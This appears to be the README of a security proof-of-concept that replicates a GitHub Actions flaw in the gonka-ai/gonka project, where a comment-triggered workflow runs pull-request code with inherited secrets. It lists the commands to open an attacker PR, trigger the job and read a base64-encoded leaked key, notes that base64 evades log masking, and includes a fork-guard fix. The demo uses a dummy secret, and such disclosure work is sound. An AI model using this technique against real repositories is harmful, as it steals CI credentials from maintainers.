# PoC replica — privileged CI on untrusted PR code (issue_comment + secrets: inherit)

Structure mirrored from `gonka-ai/gonka` (see the finding for exact upstream line numbers):

| file | mirrors |
|---|---|
| `.github/workflows/integration.yml` | `integration.yml:24,33-38,42-48,53-54` — `issue_comment` + `/run-integration` + OWNER/MEMBER guard + `secrets: inherit` + `packages: write` |
| `.github/workflows/test-workflow.yml` | `test-workflow.yml:62`, `:330`, `:387-405` — checkout `refs/pull/N/head`, run `make`, run repo script with the secret in `env` under `if: always()` |
| `.github/scripts/upload_test_results.py` | `upload_test_results.py:35,40-41` — reads `GCP_SERVICE_ACCOUNT_KEY` |
| `scripts/attacker_upload_test_results.py` | the PR's replacement file |
| `falsifier/fork_guard.patch` | the fix `verify.yml:99-181` already uses upstream |

## Run it

```bash
# 1. create the demo repo and push
gh repo create ci-replica-poc --public --source=. --push

# 2. set the secret the workflow inherits (a DUMMY — never a real key)
gh secret set GCP_SERVICE_ACCOUNT_KEY -R <you>/ci-replica-poc \
   --body '{"type":"service_account","project_id":"poc-demo","private_key_id":"DUMMYKEYID","private_key":"-----BEGIN PRIVATE KEY-----\nDUMMY-NOT-A-REAL-KEY\n-----END PRIVATE KEY-----\n","client_email":"poc@poc-demo.iam.gserviceaccount.com"}'

# 3. attacker side: branch + PR that only swaps that one file
git checkout -b feature/fix-tests
cp scripts/attacker_upload_test_results.py .github/scripts/upload_test_results.py
git commit -am "test: tidy result uploader" && git push -u origin feature/fix-tests
gh pr create --fill

# 4. maintainer side: the documented trigger
gh pr comment <PR#> --body "/run-integration"

# 5. observe
gh run list -R <you>/ci-replica-poc --workflow integration.yml -L 1
gh run view <run-id> -R <you>/ci-replica-poc --log | grep LEAKED_KEY_B64
#   -> base64 of the dummy secret, printed by the PR's own code, from a job that
#      was handed every secret via `secrets: inherit`
```

## Falsifier

Apply `falsifier/fork_guard.patch` (adds the `github.event.pull_request.head.repo.fork`
guard `verify.yml` uses) and re-run: the comment path no longer reaches the PR tree,
`LEAKED_KEY_B64` never appears.

## Notes

- The dummy secret exists so the demo has something to steal; the real finding is that the
  job hands *any* inherited secret to code taken from the PR.
- GitHub masks the literal secret in logs; base64 defeats that (masking is exact-string based),
  which is why the leak prints as `LEAKED_KEY_B64=`.
- Nothing here touches any third-party repository.
